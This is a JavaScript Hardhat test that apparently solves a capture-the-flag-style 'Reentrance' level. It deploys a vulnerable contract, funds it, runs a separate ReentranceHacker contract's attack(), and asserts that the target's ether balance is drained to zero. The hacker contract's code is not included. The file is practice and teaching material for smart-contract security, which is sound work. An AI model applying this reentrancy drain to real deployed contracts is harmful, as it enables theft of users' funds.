const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrance", function () {
  it("Reentrance", async function () {
    const [user1, user2, user3] = await ethers.getSigners();
    const Reentrance = await ethers.getContractFactory("Reentrance");
    const reentrance = await Reentrance.deploy();
    await reentrance.deployed();
    console.log(`user2: ${user2.address}`);

    let tx = await reentrance.connect(user2).donate(user2.address, {
      value: 1
    });
    await tx.wait();
    const balance = await ethers.provider.getBalance(reentrance.address);
    expect(balance.toString()).to.equal("1");
    const user2Balance = await reentrance.balanceOf(user2.address);
    expect(user2Balance.toString()).to.equal("1");

    // attack
    const ReentranceHacker = await ethers.getContractFactory("ReentranceHacker");
    const reentrance_hacker = await ReentranceHacker.deploy(reentrance.address, balance);
    await reentrance_hacker.deployed();
    tx = await reentrance.connect(user3).donate(reentrance_hacker.address, {
      value: balance
    });
    await tx.wait();
    console.log(`reentrance balance: ${ await ethers.provider.getBalance(reentrance.address)}`);

    tx = await reentrance_hacker.attack();
    await tx.wait();
    const reentranceBalance = await ethers.provider.getBalance(reentrance.address);
    console.log(`reentrance balance: ${reentranceBalance}`);
    expect(reentranceBalance).to.be.equal(0);
  });
});
